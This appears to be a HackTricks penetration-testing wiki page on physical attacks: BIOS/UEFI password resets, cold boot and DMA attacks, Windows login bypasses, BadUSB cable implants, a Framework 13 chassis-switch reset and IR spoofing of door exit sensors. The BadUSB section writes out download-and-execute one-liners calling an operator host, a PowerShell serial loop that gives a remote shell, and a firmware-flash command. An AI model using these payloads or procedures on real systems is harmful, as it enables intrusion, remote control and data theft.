# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

**Resetting the BIOS** can be achieved in several ways. Most motherboards include a **battery** that, when removed for around **30 minutes**, will reset the BIOS settings, including the password. Alternatively, a **jumper on the motherboard** can be adjusted to reset these settings by connecting specific pins.

For situations where hardware adjustments are not possible or practical, **software tools** offer a solution. Running a system from a **Live CD/USB** with distributions like **Kali Linux** provides access to tools like **_killCmos_** and **_CmosPWD_**, which can assist in BIOS password recovery.

In cases where the BIOS password is unknown, entering it incorrectly **three times** will typically result in an error code. This code can be used on websites like [https://bios-pw.org](https://bios-pw.org) to potentially retrieve a usable password.

### UEFI Security

For modern systems using **UEFI** instead of traditional BIOS, the tool **chipsec** can be utilized to analyze and modify UEFI settings, including the disabling of **Secure Boot**. This can be accomplished with the following command:

```bash
python chipsec_main.py -module exploits.secure.boot.pk
```

---

## RAM Analysis and Cold Boot Attacks

RAM retains data briefly after power is cut, usually for **1 to 2 minutes**. This persistence can be extended to **10 minutes** by applying cold substances, such as liquid nitrogen. During this extended period, a **memory dump** can be created using tools like **dd.exe** and **volatility** for analysis.

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** is a tool designed for **physical memory manipulation** through DMA, compatible with interfaces like **FireWire** and **Thunderbolt**. It allows for bypassing login procedures by patching memory to accept any password. However, it's ineffective against **Windows 10** systems.

---

## Live CD/USB for System Access

Changing system binaries like **_sethc.exe_** or **_Utilman.exe_** with a copy of **_cmd.exe_** can provide a command prompt with system privileges. Tools such as **chntpw** can be used to edit the **SAM** file of a Windows installation, allowing password changes.

**Kon-Boot** is a tool that facilitates logging into Windows systems without knowing the password by temporarily modifying the Windows kernel or UEFI. More information can be found at [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Handling Windows Security Features

### Boot and Recovery Shortcuts

- **Supr**: Access BIOS settings.
- **F8**: Enter Recovery mode.
- Pressing **Shift** after the Windows banner can bypass autologon.

### BAD USB Devices

Devices like **Rubber Ducky** and **Teensyduino** serve as platforms for creating **bad USB** devices, capable of executing predefined payloads when connected to a target computer.

### Volume Shadow Copy

Administrator privileges allow for the creation of copies of sensitive files, including the **SAM** file, through PowerShell.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3 based implants such as **Evil Crow Cable Wind** hide inside USB-A→USB-C or USB-C↔USB-C cables, enumerate purely as a USB keyboard, and expose their C2 stack over Wi-Fi. The operator only needs to power the cable from the victim host, create a hotspot named `Evil Crow Cable Wind` with password `123456789`, and browse to [http://cable-wind.local/](http://cable-wind.local/) (or its DHCP address) to reach the embedded HTTP interface.
- The browser UI provides tabs for *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, and *Config*. Stored payloads are tagged per OS, keyboard layouts are switched on the fly, and VID/PID strings can be altered to mimic known peripherals.
- Because the C2 lives inside the cable, a phone can stage payloads, trigger execution, and manage Wi-Fi credentials without touching the host OS—ideal for short dwell-time physical intrusions.

### OS-aware AutoExec payloads

- AutoExec rules bind one or more payloads to fire immediately after USB enumeration. The implant performs lightweight OS fingerprinting and selects the matching script.
- Example workflow:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) or `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Because execution is unattended, simply swapping a charging cable can achieve “plug-and-pwn” initial access under the logged-on user context.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** A stored payload opens a console and pastes a loop that executes whatever arrives on the new USB serial device. A minimal Windows variant is:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** The implant keeps the USB CDC channel open while its ESP32-S3 launches a TCP client (Python script, Android APK, or desktop executable) back to the operator. Any bytes typed into the TCP session are forwarded into the serial loop above, giving remote command execution even on air-gapped hosts. Output is limited, so operators typically run blind commands (account creation, staging additional tooling, etc.).

### HTTP OTA update surface

- The same web stack usually exposes unauthenticated firmware updates. Evil Crow Cable Wind listens on `/update` and flashes whatever binary is uploaded:

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.

## Bypassing BitLocker Encryption

BitLocker encryption can potentially be bypassed if the **recovery password** is found within a memory dump file (**MEMORY.DMP**). Tools like **Elcomsoft Forensic Disk Decryptor** or **Passware Kit Forensic** can be utilized for this purpose.

---

## Social Engineering for Recovery Key Addition

A new BitLocker recovery key can be added through social engineering tactics, convincing a user to execute a command that adds a new recovery key composed of zeros, thereby simplifying the decryption process.

---

## Exploiting Chassis Intrusion / Maintenance Switches to Factory-Reset the BIOS

Many modern laptops and small-form-factor desktops include a **chassis-intrusion switch** that is monitored by the Embedded Controller (EC) and the BIOS/UEFI firmware.  While the primary purpose of the switch is to raise an alert when a device is opened, vendors sometimes implement an **undocumented recovery shortcut** that is triggered when the switch is toggled in a specific pattern.

### How the Attack Works

1. The switch is wired to a **GPIO interrupt** on the EC.
2. Firmware running on the EC keeps track of the **timing and number of presses**.
3. When a hard-coded pattern is recognised, the EC invokes a *mainboard-reset* routine that **erases the contents of the system NVRAM/CMOS**.
4. On next boot, the BIOS loads default values – **supervisor password, Secure Boot keys, and all custom configuration are cleared**.

> Once Secure Boot is disabled and the firmware password is gone, the attacker can simply boot any external OS image and obtain unrestricted access to the internal drives.

### Real-World Example – Framework 13 Laptop

The recovery shortcut for the Framework 13 (11th/12th/13th-gen) is:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

After the tenth cycle the EC sets a flag that instructs the BIOS to wipe NVRAM at the next reboot.  The whole procedure takes ~40 s and requires **nothing but a screwdriver**.

### Generic Exploitation Procedure

1. Power-on or suspend-resume the target so the EC is running.
2. Remove the bottom cover to expose the intrusion/maintenance switch.
3. Reproduce the vendor-specific toggle pattern (consult documentation, forums, or reverse-engineer the EC firmware).
4. Re-assemble and reboot – firmware protections should be disabled.
5. Boot a live USB (e.g. Kali Linux) and perform usual post-exploitation (credential dumping, data exfiltration, implanting malicious EFI binaries, etc.).

### Detection & Mitigation

* Log chassis-intrusion events in the OS management console and correlate with unexpected BIOS resets.
* Employ **tamper-evident seals** on screws/covers to detect opening.
* Keep devices in **physically controlled areas**; assume that physical access equals full compromise.
* Where available, disable the vendor “maintenance switch reset” feature or require an additional cryptographic authorisation for NVRAM resets.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” sensors pair a near-IR LED emitter with a TV-remote style receiver module that only reports logic high after it has seen multiple pulses (~4–10) of the correct carrier (≈30 kHz).
- A plastic shroud blocks the emitter and receiver from looking directly at each other, so the controller assumes any validated carrier came from a nearby reflection and drives a relay that opens the door strike.
- Once the controller believes a target is present it often changes the outbound modulation envelope, but the receiver keeps accepting any burst that matches the filtered carrier.

### Attack Workflow
1. **Capture the emission profile** – clip a logic analyser across the controller pins to record both the pre-detection and post-detection waveforms that drive the internal IR LED.
2. **Replay only the “post-detection” waveform** – remove/ignore the stock emitter and drive an external IR LED with the already-triggered pattern from the outset. Because the receiver only cares about pulse count/frequency, it treats the spoofed carrier as a genuine reflection and asserts the relay line.
3. **Gate the transmission** – transmit the carrier in tuned bursts (e.g., tens of milliseconds on, similar off) to deliver the minimum pulse count without saturating the receiver’s AGC or interference handling logic. Continuous emission quickly desensitises the sensor and stops the relay from firing.

### Long-Range Reflective Injection
- Replacing the bench LED with a high-power IR diode, MOSFET driver, and focusing optics enables reliable triggering from ~6 m away.
- The attacker does not need line-of-sight to the receiver aperture; aiming the beam at interior walls, shelving, or door frames that are visible through glass lets reflected energy enter the ~30° field of view and mimics a close-range hand wave.
- Because the receivers expect only weak reflections, a much stronger external beam can bounce off multiple surfaces and still remain above the detection threshold.

### Weaponised Attack Torch
- Embedding the driver inside a commercial flashlight hides the tool in plain sight. Swap the visible LED for a high-power IR LED matched to the receiver’s band, add an ATtiny412 (or similar) to generate the ≈30 kHz bursts, and use a MOSFET to sink the LED current.
- A telescopic zoom lens tightens the beam for range/precision, while a vibration motor under MCU control gives haptic confirmation that modulation is active without emitting visible light.
- Cycling through several stored modulation patterns (slightly different carrier frequencies and envelopes) increases compatibility across rebranded sensor families, letting the operator sweep reflective surfaces until the relay audibly clicks and the door releases.

---

## References

- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
